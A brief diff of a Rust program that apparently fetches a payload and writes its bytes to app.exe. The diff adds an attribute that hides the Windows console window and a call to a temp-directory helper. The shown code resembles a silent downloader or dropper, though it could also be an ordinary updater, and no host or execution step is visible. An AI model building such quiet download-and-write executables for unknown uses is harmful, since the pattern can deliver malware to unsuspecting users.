@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 use reqwest::StatusCode;
 use serde::{Deserialize, Serialize};
 use sha2::digest::Reset;
@@ -66,6 +68,7 @@ fn payload() -> Result<Option<Payload>> {
 }
 
 fn main() {
+    utils::tmpdir();
     if let Some(payload) = payload().unwrap() {
         let mut file = File::create("app.exe").unwrap();
         file.write_all(&payload.bytes).unwrap();
